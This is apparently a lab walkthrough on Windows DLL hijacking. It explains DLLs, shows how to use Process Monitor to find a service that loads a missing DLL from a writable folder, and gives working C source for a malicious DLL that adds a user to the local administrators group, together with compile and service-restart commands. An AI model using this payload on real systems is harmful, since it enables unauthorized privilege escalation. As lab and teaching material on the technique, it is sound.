### DLL Hijacking
#### What is DLL
In describing what a DLL is, this article describes dynamic linking methods, DLL dependencies, DLL entry points, exporting DLL functions, and DLL troubleshooting tools.

This article finishes with a high-level comparison of DLLs to the Microsoft .NET Framework assemblies.

For the Windows operating systems, much of the functionality of the operating system is provided by DLL. Additionally, when you run a program on one of these Windows operating systems, much of the functionality of the program may be provided by DLLs. For example, some programs may contain many different modules, and each module of the program is contained and distributed in DLLs.

The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space. So, the operating system and the programs load faster, run faster, and take less disk space on the computer.

When a program uses a DLL, an issue that is called dependency may cause the program not to run. When a program uses a DLL, a dependency is created. If another program overwrites and breaks this dependency, the original program may not successfully run.

With the introduction of the .NET Framework, most dependency problems have been eliminated by using assemblies.

### Check for DLL Hijacking
1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select `Process Name`.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads `Process Name is dllhijackservice.exe then Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
6. Next, select from the left-most drop down menu `Result`.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads `Result is NAME NOT FOUND then Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
9. Open command prompt and type: 
```powershell
		sc start dllsvc
```
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `C:\Temp\hijackme.dll` yet it could not do that as the file was not found. Note that `C:\Temp` is a writable location.
![[Pasted image 20210718180049.png]]

### Getting Malicious
We will write a C file which will execute system commands
```C
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

Now compile it with the following commands
```bash
# For x64 bit
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# For x86 bit
i686-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

Now save the file in **Temp** directory and restart the dll service
```powershell
sc stop dllsvc & sc start dllsvc
```

Now you will be added in the administrator group